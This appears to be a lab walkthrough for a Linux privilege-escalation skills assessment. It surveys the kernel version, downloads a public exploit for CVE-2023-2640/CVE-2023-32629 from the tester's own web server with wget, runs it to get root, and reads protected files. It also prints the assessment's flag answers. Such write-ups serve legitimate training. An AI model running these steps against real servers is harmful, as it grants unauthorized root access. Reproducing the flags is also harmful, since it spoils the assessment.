# Skills Assement: Linux Privilege Escalation

We've ben hired to evaluate the security of an INLANEFREIGHT public servers.

We've been given access to a low privileged account and the goal of escalating our privileges so that we can get the 5 flags.


## Privilege Escalation:

Login and survey:

    htb-student@nix03:~$cat /etc/os-release
    NAME="Ubuntu"
    VERSION="20.04.1 LTS (Focal Fossa)"
    ID=ubuntu
    ID_LIKE=debian
    PRETTY_NAME="Ubuntu 20.04.1 LTS"
    VERSION_ID="20.04"
    HOME_URL="https://www.ubuntu.com/"
    SUPPORT_URL="https://help.ubuntu.com/"
    BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
    PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
    VERSION_CODENAME=focal
    UBUNTU_CODENAME=focal

    htb-student@nix03:~$ cat /proc/version 
    Linux version 5.4.0-45-generic (buildd@lgw01-amd64-033) (gcc version 9.3.0 (Ubuntu 9.3.0-10ubuntu2)) #49-Ubuntu SMP Wed Aug 26 13:38:52 UTC 2020


Look up known CVEs for this Linux version and kernel:

- Search text:

        CVE linux kernel 5.4.0-45 Ubuntu 20.04.1

- We'll find that CVE-2023-32629 can be used to exploit a privilege escalation vulnerability.


Clone the repo:

    $ git clone https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629
    

Upload the exploit and upload it to the server:

- Setup server:

        $ python -m http.server 9999
        Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...

- Upload:

        htb-student@nix03:~$ wget -rnH http://10.10.14.211:9999/CVE-2023-2640-CVE-2023-32629

Escalate Privileges:

    htb-student@nix03:~$ cd CVE-2023-2640-CVE-2023-32629
    htb-student@nix03:~/CVE-2023-2640-CVE-2023-32629$ chmod +x exploit.sh
    htb-student@nix03:~/CVE-2023-2640-CVE-2023-32629$ ./exploit.sh
    [+] You should be root now
    [+] Type 'exit' to finish and leave the house cleaned
    root@nix03:~/CVE-2023-2640-CVE-2023-32629# id
    uid=0(root) gid=1002(htb-student) groups=1002(htb-student)


## Get the flags:

Find the flags:

    root@nix03:~# find / 2>/dev/null -name flag?.txt -exec ls -l {} \;
    -rwx------ 1 barry barry 29 Sep  5  2020 /home/barry/flag2.txt
    -rw-r----- 1 root adm 23 Sep  5  2020 /var/log/flag3.txt
    -rw------- 1 tomcat tomcat 25 Sep  5  2020 /var/lib/tomcat9/flag4.txt
    -rw-r--r-- 1 root root 35 Sep  5  2020 /root/flag5.txt

Read the files:
    
    root@nix03:~# cat /home/barry/flag2.txt
    LLPE{ch3ck_th0se_cmd_l1nes!}
    
    root@nix03:~# cat /var/log/flag3.txt
    LLPE{h3y_l00k_a_fl@g!}
    
    root@nix03:~# cat /var/lib/tomcat9/flag4.txt
    LLPE{im_th3_m@nag3r_n0w}

    root@nix03:~# cat /root/flag5.txt
    LLPE{0ne_sudo3r_t0_ru13_th3m_@ll!}




